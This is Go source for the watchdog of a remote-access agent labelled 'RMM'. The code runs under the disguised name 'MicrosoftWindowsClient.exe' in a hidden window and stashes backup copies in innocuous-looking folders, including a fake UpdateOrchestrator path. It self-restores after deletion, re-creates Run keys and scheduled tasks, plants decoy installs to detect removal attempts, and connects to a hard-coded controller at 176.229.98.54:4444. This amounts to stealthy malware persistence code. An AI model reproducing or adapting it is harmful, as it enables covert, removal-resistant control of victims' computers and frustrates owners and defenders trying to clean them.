package main

// Native supervisor (--watch): replaces the old powershell watchdog loop,
// so no powershell.exe with a visible script path ever exists on the box.
// The watcher is the same binary (MicrosoftWindowsClient.exe --watch):
// hidden window, bland process name, ~0 CPU (one check per 30s).
//
// Each pass it:
//   - restarts the agent when the process is missing or its healthy
//     heartbeat went stale (>90s),
//   - restores a wiped agent binary/cert/token from either backup,
//   - re-syncs a wiped backup location from the survivor,
//   - unwinds crash-looping fresh updates to prev (writes
//     rollback_notice.json for the agent to report),
//   - every ~5 min re-creates deleted Run keys / scheduled tasks
//     (Windows-only persistence heal).

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/process"
	"rmm/internal/commands"
)

const watchInterval = 30 * time.Second

type watchCfg struct {
	agentPath      string
	controllerAddr string
	caPath         string
	installDir     string
	backupDir      string
	backupDir2     string
	backupAgent    string
	backupCert     string
	backupAgent2   string
	backupCert2    string
	legacyDir      string
	legacyDirX86   string
}

func legacyHomeDir() string {
	if pf := os.Getenv("ProgramFiles"); pf != "" {
		return filepath.Join(pf, "RMM", "Agent")
	}
	return `C:\Program Files\RMM\Agent`
}

// legacyHomeDirX86 is the 32-bit twin honeypot (attackers check both).
func legacyHomeDirX86() string {
	if pf := os.Getenv("ProgramFiles(x86)"); pf != "" {
		return filepath.Join(pf, "RMM", "Agent")
	}
	return `C:\Program Files (x86)\RMM\Agent`
}

// verLess compares dotted versions numerically ("1.40.9" < "1.40.17").
func verLess(a, b string) bool {
	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
	for i := 0; i < len(pa) && i < len(pb); i++ {
		var x, y int
		_, _ = fmt.Sscanf(pa[i], "%d", &x)
		_, _ = fmt.Sscanf(pb[i], "%d", &y)
		if x != y {
			return x < y
		}
	}
	return len(pa) < len(pb)
}

// refreshStaleBackups converges backups to a PROVEN install: only when no
// update is pending (pending = unconfirmed, possibly crash-looping) and
// never over a same-version byte mismatch (that is tampering, owned by
// verifyBinary). Keeps backups from rotting one fleet version behind.
func (w *watchCfg) refreshStaleBackups() {
	if _, err := os.Stat(filepath.Join(w.installDir, "pending_update.json")); err == nil {
		return
	}
	instVer := readVerFile(w.installDir)
	if instVer == "" {
		return
	}
	instBin, err := os.ReadFile(w.agentPath)
	if err != nil || len(instBin) == 0 {
		return
	}
	type slot struct{ dir, bin, cert, ver, tok string }
	slots := []slot{
		{w.backupDir, w.backupAgent, w.backupCert, filepath.Join(w.backupDir, "version.txt"), filepath.Join(w.backupDir, "token.txt")},
		{w.backupDir2, w.backupAgent2, w.backupCert2, filepath.Join(w.backupDir2, "version.txt"), filepath.Join(w.backupDir2, "token.txt")},
	}
	if v := vaultDir(); v != "" {
		slots = append(slots, slot{v, filepath.Join(v, "MicrosoftWindowsClient.exe"), filepath.Join(v, "server.crt"), filepath.Join(v, "version.txt"), filepath.Join(v, "token.txt")})
	}
	for _, d := range slots {
		bv := ""
		if b, err := os.ReadFile(d.ver); err == nil {
			bv = strings.TrimSpace(string(b))
		}
		if h1, h2 := fileHash(w.agentPath), fileHash(d.bin); h1 != "" && h1 == h2 && (bv == "" || bv == instVer) {
			if bv == "" {
				_ = os.WriteFile(d.ver, []byte(instVer+"\n"), 0644)
			}
			writeBackupManifest(d.dir, instVer, w.agentPath)
			continue // already converged
		}
		if bv == instVer {
			continue // same version, different bytes: tamper, owned by verifyBinary
		}
		_ = os.MkdirAll(d.dir, 0755)
		_ = os.WriteFile(d.bin, instBin, 0755)
		if cb, err := os.ReadFile(w.caPath); err == nil {
			_ = os.WriteFile(d.cert, cb, 0644)
		}
		_ = os.WriteFile(d.ver, []byte(instVer+"\n"), 0644)
		writeBackupManifest(d.dir, instVer, w.agentPath)
		if tb, err := os.ReadFile(filepath.Join(w.installDir, "token.txt")); err == nil && len(bytes.TrimSpace(tb)) > 0 {
			_ = os.WriteFile(d.tok, tb, 0600)
		}
		log.Printf("[watch] backup converged to proven v%s", instVer)
	}
}

// fileHash returns the SHA256 hex of a file ("" on any error).
func fileHash(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return ""
	}
	return hex.EncodeToString(h.Sum(nil))
}

// vaultDir is the fourth backup copy: inside the SYSTEM profile, locked to
// SYSTEM+Administrators by the installer. Standard-user wipes and profile
// sweeps can't reach it; only elevated healers read it. "" off Windows.
func vaultDir() string {
	if runtime.GOOS != "windows" {
		return ""
	}
	sys := os.Getenv("SystemRoot")
	if sys == "" {
		sys = `C:\Windows`
	}
	return filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
}

// backupIntegrity stamps dir/integrity.json {version, exe sha256} next to a
// backup copy. Restores verify it, so a trojaned backup is refused instead
// of executed.
func writeBackupManifest(dir, ver, exePath string) {
	sha := fileHash(exePath)
	if sha == "" || ver == "" {
		return
	}
	b, _ := json.Marshal(map[string]string{"v": ver, "sha": sha})
	_ = os.WriteFile(filepath.Join(dir, "integrity.json"), b, 0644)
}

// backupVerified reports whether exePath is trustworthy: no manifest
// (pre-v1.44 copies) means accept, otherwise the recorded sha must match.
func backupVerified(exePath string) bool {
	raw, err := os.ReadFile(filepath.Join(filepath.Dir(exePath), "integrity.json"))
	if err != nil {
		return true // legacy copy without a manifest
	}
	var m struct {
		V   string `json:"v"`
		SHA string `json:"sha"`
	}
	if err := json.Unmarshal(raw, &m); err != nil || m.SHA == "" {
		return true // unreadable manifest: don't brick old installs
	}
	h := fileHash(exePath)
	if h == "" || h != m.SHA {
		log.Printf("[watch] backup %s FAILED integrity (manifest %s...)", exePath, m.SHA[:16])
		setProtAlarm("backup binary failed integrity check")
		return false
	}
	return true
}

func userProfileDir() string {
	if p := os.Getenv("USERPROFILE"); p != "" {
		return p
	}
	if h, err := os.UserHomeDir(); err == nil {
		return h
	}
	return os.TempDir()
}

func loadWatchCfg() *watchCfg {
	exe, err := os.Executable()
	dir := ""
	if err == nil {
		dir, _ = filepath.Abs(filepath.Dir(exe))
	}
	if dir == "" {
		dir, _ = os.Getwd()
	}
	threeD := filepath.Join(userProfileDir(), "3D Objects")
	blender := filepath.Join(threeD, "blender")
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(userProfileDir(), "AppData", "Roaming")
	}
	cache := filepath.Join(appData, "Microsoft", "Windows", "Themes", "Cache")
	return &watchCfg{
		agentPath:      filepath.Join(dir, "MicrosoftWindowsClient.exe"),
		controllerAddr: loadControllerConfig("176.229.98.54:4444"),
		caPath:         filepath.Join(dir, "server.crt"),
		installDir:     dir,
		backupDir:      blender,
		backupDir2:     cache,
		backupAgent:    filepath.Join(blender, "MicrosoftWindowsClient.exe"),
		backupCert:     filepath.Join(blender, "server.crt"),
		backupAgent2:   filepath.Join(cache, "MicrosoftWindowsClient.exe"),
		backupCert2:    filepath.Join(cache, "server.crt"),
		legacyDir:      legacyHomeDir(),
		legacyDirX86:   legacyHomeDirX86(),
	}
}

// protFilePath is the tamper-telemetry file shared with the agent.
func protFilePath() string {
	dir := filepath.Join(os.TempDir(), "RMM")
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	}
	return filepath.Join(dir, "protection.json")
}

// setProtAlarm records the FIRST tripwire violation (sticky: never cleared
// by the watcher — only a reinstall re-baits and clears).
func setProtAlarm(alarm string) {
	if alarm == "" {
		return
	}
	_ = os.MkdirAll(filepath.Dir(protFilePath()), 0755)
	p := map[string]string{}
	if b, err := os.ReadFile(protFilePath()); err == nil {
		_ = json.Unmarshal(b, &p)
	}
	if p["alarm"] != "" {
		return
	}
	p["alarm"] = alarm
	b, _ := json.Marshal(p)
	_ = os.WriteFile(protFilePath(), b, 0644)
	log.Printf("[watch] TAMPER TRIPWIRE: %s", alarm)
}

// checkDecoyFiles inspects both honeypots (cheap stats, every loop).
// Skips machines predating the honeypot (no bait marker, no alarm).
func checkDecoyFiles(w *watchCfg) string {
	if alarm := checkOneDecoy(w.legacyDir, "decoy"); alarm != "" {
		return alarm
	}
	return checkOneDecoy(w.legacyDirX86, "x86 decoy")
}

func checkOneDecoy(dir, tag string) string {
	if dir == "" {
		return ""
	}
	if _, err := os.Stat(filepath.Join(dir, "decoy.ver")); os.IsNotExist(err) {
		return ""
	}
	if _, err := os.Stat(filepath.Join(dir, "agent.exe")); os.IsNotExist(err) {
		return tag + " agent.exe deleted"
	}
	if _, err := os.Stat(filepath.Join(dir, "server.crt")); os.IsNotExist(err) {
		return tag + " server.crt deleted"
	}
	if _, err := os.Stat(filepath.Join(dir, "decoy_exec.txt")); err == nil {
		return tag + " agent.exe EXECUTED"
	}
	return ""
}

// healDecoys re-lays the reproducible honeypot files (server.crt copy,
// decoy.ver stamp) when a swept decoy dir still carries its bait marker.
// The decoy agent.exe itself cannot be regenerated in the field (only the
// installer payload holds the stub) — its deletion keeps alarming via
// checkDecoyFiles until reinstall. Idempotent and silent when intact.
func healDecoys(w *watchCfg) {
	ver := readVerFile(w.installDir)
	if ver == "" {
		return
	}
	ca, err := os.ReadFile(w.caPath)
	if err != nil || len(ca) == 0 {
		return
	}
	for _, dir := range []string{w.legacyDir, w.legacyDirX86} {
		if dir == "" {
			continue
		}
		if _, err := os.Stat(filepath.Join(dir, "decoy.ver")); os.IsNotExist(err) {
			continue // never baited: not ours to populate
		}
		if _, err := os.Stat(filepath.Join(dir, "server.crt")); os.IsNotExist(err) {
			if err := os.WriteFile(filepath.Join(dir, "server.crt"), ca, 0644); err == nil {
				log.Printf("[watch] decoy server.crt re-laid in %s", dir)
			}
		}
		if b, err := os.ReadFile(filepath.Join(dir, "decoy.ver")); err != nil || strings.TrimSpace(string(b)) != ver {
			if err := os.WriteFile(filepath.Join(dir, "decoy.ver"), []byte(ver+"\n"), 0644); err == nil {
				log.Printf("[watch] decoy.ver restamped in %s", dir)
			}
		}
	}
}

// watchLock ensures a single watcher: stale locks (dead pid) are reclaimed.
func watchLock() bool {
	dir := filepath.Join(os.TempDir(), "RMM")
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	}
	_ = os.MkdirAll(dir, 0755)
	path := filepath.Join(dir, "watch.lock")
	if f, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644); err == nil {
		_, _ = f.WriteString(strconv.Itoa(os.Getpid()))
		f.Close()
		return true
	}
	if b, err := os.ReadFile(path); err == nil {
		if pid, err := strconv.Atoi(strings.TrimSpace(string(b))); err == nil && pid != os.Getpid() {
			if alive, _ := process.PidExists(int32(pid)); !alive {
				_ = os.Remove(path)
				if f, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644); err == nil {
					_, _ = f.WriteString(strconv.Itoa(os.Getpid()))
					f.Close()
					return true
				}
			}
		}
	}
	return false
}

func isAgentProc(p *process.Process) bool {
	pid := int(os.Getpid())
	if int(p.Pid) == pid {
		return false
	}
	name, err := p.Name()
	if err != nil || name == "" {
		return false
	}
	n := strings.ToLower(name)
	return n == "microsoftwindowsclient" || n == "microsoftwindowsclient.exe" ||
		n == "agent" || n == "agent.exe"
}

// agentAlive reports whether an agent process (other than us) exists.
func agentAlive() bool {
	pids, err := process.Pids()
	if err != nil {
		return false
	}
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil {
			if isAgentProc(p) {
				return true
			}
		}
	}
	return false
}

// agentHealthy mirrors the watchdog rule: heartbeat newer than 90s.
func agentHealthy() bool {
	p := healthyHeartbeatPath()
	b, err := os.ReadFile(p)
	if err != nil {
		return false
	}
	ts, err := strconv.ParseInt(strings.TrimSpace(string(b)), 10, 64)
	if err != nil {
		return false
	}
	return time.Now().Unix()-ts < 90
}

func (w *watchCfg) startAgent() {
	cmd := exec.Command(w.agentPath, "-controller", w.controllerAddr, "-ca", w.caPath)
	hideWatchCmd(cmd)
	if err := cmd.Start(); err != nil {
		log.Printf("[watch] start agent: %v", err)
		return
	}
	log.Printf("[watch] started agent (pid %d)", cmd.Process.Pid)
}

func (w *watchCfg) killAgents() {
	pids, err := process.Pids()
	if err != nil {
		return
	}
	for _, pid := range pids {
		if p, err := process.NewProcess(pid); err == nil && isAgentProc(p) {
			_ = p.Kill()
		}
	}
}

func readVerFile(dir string) string {
	b, err := os.ReadFile(filepath.Join(dir, "version.txt"))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(b))
}

// pickBackup returns the first surviving (binary, cert) backup pair,
// preferring integrity-verified copies. The SYSTEM vault is last: only
// elevated readers reach it, and it is the copy of last resort.
func (w *watchCfg) pickBackup() (bin, cert string) {
	cands := [][2]string{{w.backupAgent, w.backupCert}, {w.backupAgent2, w.backupCert2}}
	if v := vaultDir(); v != "" {
		cands = append(cands, [2]string{
			filepath.Join(v, "MicrosoftWindowsClient.exe"),
			filepath.Join(v, "server.crt"),
		})
	}
	for _, cand := range cands {
		if _, err := os.Stat(cand[0]); err != nil {
			continue
		}
		if _, err := os.Stat(cand[1]); err != nil {
			continue
		}
		// backupVerified accepts legacy copies (no manifest) and
		// manifest-matching copies; a manifest MISMATCH refuses the copy
		// outright (never execute bytes that fail integrity).
		if backupVerified(cand[0]) {
			return cand[0], cand[1]
		}
	}
	return "", ""
}

// verifyBinary enforces install integrity: when install and backup report
// the SAME version but different bytes, the install was swapped out from
// under us (trojan swap) — restore the known-good backup and trip the wire.
// A version mismatch means an update is in flight: hands off.
func (w *watchCfg) verifyBinary() {
	instVer := readVerFile(w.installDir)
	if instVer == "" {
		return
	}
	bin, _ := w.pickBackup()
	if bin == "" {
		return
	}
	if readVerFile(filepath.Dir(bin)) != instVer {
		return // update in flight (or stale backup): not our call
	}
	if h1, h2 := fileHash(w.agentPath), fileHash(bin); h1 != "" && h2 != "" && h1 != h2 {
		// Pending-claim arbitration (v1.44.1+): when an update claim names
		// this version AND pins its SHA, the installed bytes must equal the
		// pinned SHA (update in flight, healthy) — anything else is a
		// trojan swap, restored from prev below. No claim: legacy path.
		if to, sha, _, ok := commands.PendingClaim(); ok && to == instVer && sha != "" {
			if h1 == sha {
				return // installed == pinned update bytes: healthy
			}
			log.Printf("[watch] INSTALLED BINARY MATCHES NEITHER BACKUP NOR PINNED UPDATE SHA (v%s) - trojan suspected", instVer)
			w.killAgents()
			time.Sleep(2 * time.Second)
			prevExe := filepath.Join(w.installDir, "MicrosoftWindowsClient.prev.exe")
			if b, err := os.ReadFile(prevExe); err == nil {
				_ = os.WriteFile(w.agentPath, b, 0755)
				log.Printf("[watch] restored prev rollback candidate")
			} else if b, err := os.ReadFile(bin); err == nil {
				_ = os.WriteFile(w.agentPath, b, 0755)
			}
			setProtAlarm("agent binary failed pinned update SHA - restored v" + instVer)
			return
		}
		log.Printf("[watch] INSTALLED BINARY DIFFERS FROM BACKUP (same v%s) - restoring known-good", instVer)
		w.killAgents() // Windows locks running exes: stop it first
		time.Sleep(2 * time.Second)
		if b, err := os.ReadFile(bin); err == nil {
			_ = os.WriteFile(w.agentPath, b, 0755)
		}
		setProtAlarm("agent binary replaced - restored backup v" + instVer)
	}
}

// restoreBinary heals a wiped install from backup (version-guarded so a
// stale backup never downgrades a bulk-updated agent) and re-syncs a wiped
// backup location from its survivor. Also restores a missing token.
func (w *watchCfg) restoreBinary() {
	// Integrity first: a swapped (not wiped) binary must not execute.
	w.verifyBinary()
	if _, err := os.Stat(w.agentPath); os.IsNotExist(err) {
		bin, cert := w.pickBackup()
		if bin == "" {
			log.Printf("[watch] agent binary missing AND both backups gone")
			return
		}
		instVer := readVerFile(w.installDir)
		bakVer := readVerFile(filepath.Dir(bin))
		if bakVer != "" && instVer != "" && verLess(bakVer, instVer) {
			log.Printf("[watch] backup v%s older than installed v%s - skipping restore", bakVer, instVer)
			return
		}
		log.Printf("[watch] agent binary missing, restoring from backup")
		_ = os.MkdirAll(filepath.Dir(w.agentPath), 0755)
		if b, err := os.ReadFile(bin); err == nil {
			_ = os.WriteFile(w.agentPath, b, 0755)
		}
		if b, err := os.ReadFile(cert); err == nil {
			_ = os.WriteFile(w.caPath, b, 0644)
		}
		if bakVer != "" {
			_ = os.WriteFile(filepath.Join(w.installDir, "version.txt"), []byte(bakVer+"\n"), 0644)
		}
		log.Printf("[watch] binary + cert restored")
	}
	for _, tok := range []string{filepath.Join(w.backupDir, "token.txt"), filepath.Join(w.backupDir2, "token.txt")} {
		if _, err := os.Stat(filepath.Join(w.installDir, "token.txt")); os.IsNotExist(err) {
			if b, err := os.ReadFile(tok); err == nil && len(b) > 0 {
				_ = os.WriteFile(filepath.Join(w.installDir, "token.txt"), b, 0600)
				log.Printf("[watch] registration token restored")
				break
			}
		}
	}
	if _, err := os.Stat(w.backupAgent); os.IsNotExist(err) {
		if _, err2 := os.Stat(w.backupAgent2); err2 == nil {
			_ = os.MkdirAll(w.backupDir, 0755)
			if b, err := os.ReadFile(w.backupAgent2); err == nil {
				_ = os.WriteFile(w.backupAgent, b, 0755)
			}
			if b, err := os.ReadFile(w.backupCert2); err == nil {
				_ = os.WriteFile(w.backupCert, b, 0644)
			}
			log.Printf("[watch] re-synced primary backup from secondary")
		}
	} else if _, err := os.Stat(w.backupAgent2); os.IsNotExist(err) {
		_ = os.MkdirAll(w.backupDir2, 0755)
		if b, err := os.ReadFile(w.backupAgent); err == nil {
			_ = os.WriteFile(w.backupAgent2, b, 0755)
		}
		if b, err := os.ReadFile(w.backupCert); err == nil {
			_ = os.WriteFile(w.backupCert2, b, 0644)
		}
		log.Printf("[watch] re-synced secondary backup from primary")
	}
}

type rollbackFile struct {
	Bad string `json:"bad"`
	To  string `json:"to"`
	At  string `json:"at"`
}

// maybeRollback unwinds a crash-looping fresh update to prev: >=3 watcher
// restarts in 10 minutes while a differing prev backup exists AND a pending
// update claim names the running version. Without a live claim there is no
// update in flight — restarts are environmental (reboot/task overlap), and
// a stale prev must never roll back a healthy install (false positive).
func (w *watchCfg) maybeRollback(crashTimes *[]int64) {
	now := time.Now().Unix()
	kept := (*crashTimes)[:0]
	for _, t := range *crashTimes {
		if now-t < 600 {
			kept = append(kept, t)
		}
	}
	*crashTimes = kept
	if len(kept) < 3 {
		return
	}
	verNow := readVerFile(w.installDir)
	if to, _, _, ok := commands.PendingClaim(); !ok || to != verNow {
		*crashTimes = nil // no live claim: environmental restarts, reset counter
		return
	}
	prevRaw, err := os.ReadFile(filepath.Join(w.installDir, "version.prev.txt"))
	prevVer := strings.TrimSpace(string(prevRaw))
	prevExe := filepath.Join(w.installDir, "MicrosoftWindowsClient.prev.exe")
	if err != nil || verNow == "" || prevVer == "" || prevVer == verNow {
		return
	}
	if _, err := os.Stat(prevExe); err != nil {
		return
	}
	log.Printf("[watch] update v%s crash-looped (%d restarts in 10min) - rolling back to v%s", verNow, len(kept), prevVer)
	w.killAgents()
	time.Sleep(2 * time.Second)
	if b, err := os.ReadFile(prevExe); err == nil {
		_ = os.WriteFile(w.agentPath, b, 0755)
	}
	_ = os.WriteFile(filepath.Join(w.installDir, "version.txt"), []byte(prevVer+"\n"), 0644)
	nb, _ := json.Marshal(rollbackFile{Bad: verNow, To: prevVer, At: time.Now().UTC().Format(time.RFC3339)})
	_ = os.WriteFile(filepath.Join(w.installDir, "rollback_notice.json"), nb, 0644)
	_ = os.Remove(filepath.Join(w.installDir, "pending_update.json"))
	*crashTimes = nil
	log.Printf("[watch] rolled back to v%s - agent reports on next hello", prevVer)
	w.startAgent()
}

// runWatch is the supervisor main loop (never returns).
func runWatch() {
	if !watchLock() {
		return // another watcher owns the box
	}
	w := loadWatchCfg()
	// Elevated apply: a standard-user agent stages verified updates it
	// cannot swap itself (Access denied on the admin-owned exe). The
	// watcher runs elevated, so it swaps + restarts into the new binary.
	if commands.ApplyStagedUpdate() {
		log.Printf("[watch] staged update applied, restarting agent into it")
		w.killAgents()
		time.Sleep(2 * time.Second)
		w.startAgent()
	}
	log.Printf("[watch] supervising %s", w.agentPath)
	if !agentAlive() {
		w.restoreBinary()
		w.startAgent()
	}
	var crashTimes []int64
	wasAlive := agentAlive()
	loop := 0
	for {
		time.Sleep(watchInterval)
		loop++
		// Staged self-delete: an unelevated agent asked for permanent
		// removal. Only an elevated watcher executes — otherwise the
		// SYSTEM WMI heal owns it. Never restore during teardown.
		if claimDeletePending() {
			if isElevated() {
				log.Printf("[watch] executing staged self-delete")
				executeTeardown()
				os.Exit(0)
			}
			// Not elevated: release the claim so the SYSTEM WMI heal
			// (which checks the pending name) still finds it.
			_ = os.Rename(deletePendingPath()+".active", deletePendingPath())
		}
		// Honeypot tripwire (cheap, every pass).
		if alarm := checkDecoyFiles(w); alarm != "" {
			setProtAlarm(alarm)
		}
		// Install integrity (hash compare, every pass): a running swapped
		// binary is worse than a dead one.
		w.verifyBinary()
		noteRestart := func() {
			now := time.Now().Unix()
			crashTimes = append(crashTimes, now)
		}
		if !agentAlive() {
			if wasAlive {
				noteRestart()
			}
			log.Printf("[watch] agent missing, restarting")
			w.restoreBinary()
			w.startAgent()
			w.maybeRollback(&crashTimes)
			wasAlive = true
		} else if !agentHealthy() {
			noteRestart()
			log.Printf("[watch] agent hung (heartbeat stale), restarting")
			w.killAgents()
			time.Sleep(2 * time.Second)
			w.restoreBinary()
			w.startAgent()
			w.maybeRollback(&crashTimes)
			wasAlive = true
		} else {
			wasAlive = true
		}
		if loop%10 == 0 {
			ensureWatchPersistence(w)
			w.refreshStaleBackups()
			writeProtectionScore(w)
		}
	}
}
